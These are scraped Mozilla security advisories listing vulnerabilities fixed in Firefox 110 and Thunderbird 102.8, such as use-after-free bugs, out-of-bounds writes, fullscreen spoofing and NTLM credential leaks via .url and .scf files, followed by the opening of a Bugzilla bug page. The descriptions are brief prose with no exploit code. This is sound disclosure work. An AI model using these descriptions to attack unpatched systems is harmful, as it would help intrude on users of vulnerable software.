=== Content from www.mozilla.org_ce722dd0_20250115_085144.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-05

## Security Vulnerabilities fixed in Firefox 110

Announced
February 14, 2023
Impact
high
Products
Firefox
Fixed in

* Firefox 110

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-25743: Fullscreen notification not shown in Firefox Focus](#CVE-2023-25743)

Reporter
Hafiizh
Impact
high
##### Description

A lack of in app notification for entering fullscreen mode could have lead to a malicious website spoofing browser chrome.
*This bug only affects Firefox Focus. Other versions of Firefox are unaffected.*

##### References

* [Bug 1800203](https://bugzilla.mozilla.org/show_bug.cgi?id=1800203)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Firefox with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25740: Opening local .scf files could cause unexpected network loads](#CVE-2023-25740)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

After downloading a Windows `.scf` script from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox for Windows. Other operating systems are unaffected.*

##### References

* [Bug 1812354](https://bugzilla.mozilla.org/show_bug.cgi?id=1812354)

#### [#CVE-2023-25731: Prototype pollution when rendering URLPreview](#CVE-2023-25731)

Reporter
pyakovlev & Alexander Volkov
Impact
low
##### Description

Due to URL previews in the network panel of developer tools improperly storing URLs, query parameters could potentially be used to overwrite global objects in privileged code.

##### References

* [Bug 1801542](https://bugzilla.mozilla.org/show_bug.cgi?id=1801542)

#### [#CVE-2023-25733: Possible null pointer dereference in TaskbarPreviewCallback](#CVE-2023-25733)

Reporter
Ronald Crane
Impact
low
##### Description

The return value from `gfx::SourceSurfaceSkia::Map()` wasn't being verified which could have potentially lead to a null pointer dereference.

##### References

* [Bug 1808632](https://bugzilla.mozilla.org/show_bug.cgi?id=1808632)

#### [#CVE-2023-25736: Invalid downcast in GetTableSelectionMode](#CVE-2023-25736)

Reporter
Lukas Bernhard
Impact
low
##### Description

An invalid downcast from `nsHTMLDocument` to `nsIContent` could have lead to undefined behavior.

##### References

* [Bug 1811331](https://bugzilla.mozilla.org/show_bug.cgi?id=1811331)

#### [#CVE-2023-25741: Same-origin policy leak via image drag and drop](#CVE-2023-25741)

Reporter
Dohyun Lee (@l33d0hyun) of SSD Labs
Impact
low
##### Description

When dragging and dropping an image cross-origin, the image's size could potentially be leaked. This behavior was shipped in 109 and caused web compatibility problems as well as this security concern, so the behavior was disabled until further review.

##### References

* [Bug 1813376](https://bugzilla.mozilla.org/show_bug.cgi?id=1813376)
* [Bug 1437126](https://bugzilla.mozilla.org/show_bug.cgi?id=1437126)
* [Bug 1812611](https://bugzilla.mozilla.org/show_bug.cgi?id=1812611)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25744: Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](#CVE-2023-25744)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Kershaw Chang and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109 and Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1789449%2C1803628%2C1810536)

#### [#CVE-2023-25745: Memory safety bugs fixed in Firefox 110](#CVE-2023-25745)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Timothy Nikkel, Gabriele Svelto, Jeff Muizelaar and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1688592%2C1797186%2C1804998%2C1806521%2C1813284)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_38b9263f_20250115_085147.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-07

## Security Vulnerabilities fixed in Thunderbird 102.8

Announced
February 15, 2023
Impact
low
Products
Thunderbird
Fixed in

* Thunderbird 102.8

*Except for CVE-2023--0616, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2023-0616: User Interface lockup with messages combining S/MIME and OpenPGP](#CVE-2023-0616)

Reporter
Kai Engert
Impact
low
##### Description

If a MIME email combines OpenPGP and OpenPGP MIME data in a certain way Thunderbird repeatedly attempts to process and display the message, which could cause Thunderbird's user interface to lock up and no longer respond to the user's actions. An attacker could send a crafted message with this structure to attempt a DoS attack.

##### References

* [Bug 1806507](https://bugzilla.mozilla.org/show_bug.cgi?id=1806507)

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Thunderbird with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Thunderbird on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Thunderbird on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25746: Memory safety bugs fixed in Thunderbird 102.8](#CVE-2023-25746)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Philipp and Gabriele Svelto reported memory safety bugs present in Thunderbird 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1544127%2C1762368%2C1789449%2C1803628%2C1810536)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_28be8fd8_20250115_085138.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1809923)
* [XML](/show_bug.cgi?ctype=xml&id=1809923)

Closed
[Bug 1809923](/show_bug.cgi?id=1809923)
(CVE-2023-25734)

Opened 2 years ago
Closed 2 years ago

# .url extension Download leads to Arbitrary File Read

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

.url extension Download leads to Arbitrary File Read

## Categories

### (Firefox :: File Handling, defect, P1)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
